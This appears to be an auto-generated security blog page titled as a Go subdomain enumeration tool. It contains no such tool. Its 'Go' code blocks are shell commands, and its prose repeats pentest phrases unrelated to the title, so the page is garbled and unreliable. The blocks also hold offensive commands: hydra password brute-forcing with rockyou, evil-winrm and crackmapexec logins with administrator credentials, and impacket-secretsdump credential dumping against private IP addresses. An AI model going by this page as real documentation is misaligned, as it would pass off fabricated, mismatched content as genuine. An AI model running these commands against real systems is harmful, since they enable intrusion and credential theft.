---
TitleSEO: "Subdomain Enumeration Tool in Go | ZureFX"
TitlePost: "Subdomain Enumeration Tool — Go"
Author: "ZureFX"
Description: "A Go script for subdomain enumeration tool. Built for security research and automation."
Keywords: "tool, python, rust, automation, fuzzer, powershell, go"
URL: "https://zurefx.github.io/scripting/script-subdomain-enumeration-tool-454.html"
URL_IMAGES: ""
Date: "2025-11-30"
Tags: "Tool, Python, Rust, Automation, Fuzzer, PowerShell, Go"
Section: "scripting"
Lang: "en"
main_img: "script-subdomain-enumeration-tool-454"
Permalink: "/scripting/script-subdomain-enumeration-tool-454.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `smbexec`
- `dcomexec`
- `sharphound`

## Implementation

### Core Logic

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```go
nmap -sCV -p23,3268,587 10.57.106.222 -oN scan.txt
crackmapexec smb 10.111.165.28 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.109.236.25/FUZZ
crackmapexec smb 10.126.60.105 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.46.9 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.114.114.195 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.104.160 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.46.215.223 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.183.134
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 23.46s
```
